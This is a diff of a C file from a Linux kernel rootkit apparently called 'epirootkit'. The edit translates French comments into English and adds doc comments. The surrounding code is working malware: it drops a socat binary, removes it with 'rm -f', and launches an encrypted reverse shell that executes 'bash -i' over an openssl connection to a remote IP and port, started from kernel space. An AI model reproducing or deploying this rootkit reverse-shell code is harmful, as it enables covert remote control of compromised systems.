@@ -1,17 +1,21 @@
 #include "socat.h"
 
-#include <linux/completion.h> // Pour attendre la fin du processus
+#include <linux/completion.h>
 #include <linux/err.h>
 #include <linux/file.h>
 #include <linux/fs.h>
 #include <linux/kmod.h>
 #include <linux/kthread.h>
-#include <linux/sched.h> // Pour les structures de processus
+#include <linux/sched.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 
 #include "epirootkit.h"
 
+/**
+ * Checks if the socat binary has been dropped (exists at SOCAT_BINARY_PATH).
+ * @return true if the socat binary exists at the specified path, false otherwise.
+ */
 static int is_socat_binaire_dropped(void) {
     struct file *f;
     f = filp_open(SOCAT_BINARY_PATH, O_RDONLY, 0);
@@ -21,6 +25,10 @@ static int is_socat_binaire_dropped(void) {
     return true;
 }
 
+/**
+ * Drops the socat binary at the specified path.
+ * @return SUCCESS on success, negative error code on failure.
+ */
 int drop_socat_binaire(void) {
     if (is_socat_binaire_dropped()) {
         DBG_MSG("drop_socat_binaire: socat binary already dropped\n");
@@ -57,6 +65,10 @@ int drop_socat_binaire(void) {
     return SUCCESS;
 }
 
+/**
+ * Removes the socat binary from the specified path.
+ * @return SUCCESS on success, negative error code on failure.
+ */
 int remove_socat_binaire(void) {
     exec_str_as_command("rm -f " SOCAT_BINARY_PATH, false);
     if (is_socat_binaire_dropped()) {
@@ -67,27 +79,27 @@ int remove_socat_binaire(void) {
     return SUCCESS;
 }
 
-// Fonction pour lancer le reverse shell
+// Function to launch the reverse shell
 int launch_reverse_shell(char *args) {
     if (!is_socat_binaire_dropped()) {
         ERR_MSG("launch_reverse_shell: socat binary not dropped\n");
         return -FAILURE;
     }
 
-    int port = REVERSE_SHELL_PORT; // Port par defaut
+    int port = REVERSE_SHELL_PORT; // Default port
 
-    // Recuperer le port
+    // Get the port
     if (args && strlen(args) > 0)
         port = simple_strtol(args, NULL, 10);
 
-    // Construire la commande socat avec le port spécifié
+    // Build the socat command with the specified port
     char cmd[256];
     snprintf(cmd, sizeof(cmd),
              "%s exec:'bash -i',pty,stderr,setsid,sigint,sane "
              "openssl-connect:%s:%d,verify=0 &",
              SOCAT_BINARY_PATH, ip, port);
 
-    // Lancer la commande
+    // Launch the command
     int ret_code = exec_str_as_command(cmd, false);
 
     if (ret_code < 0) {
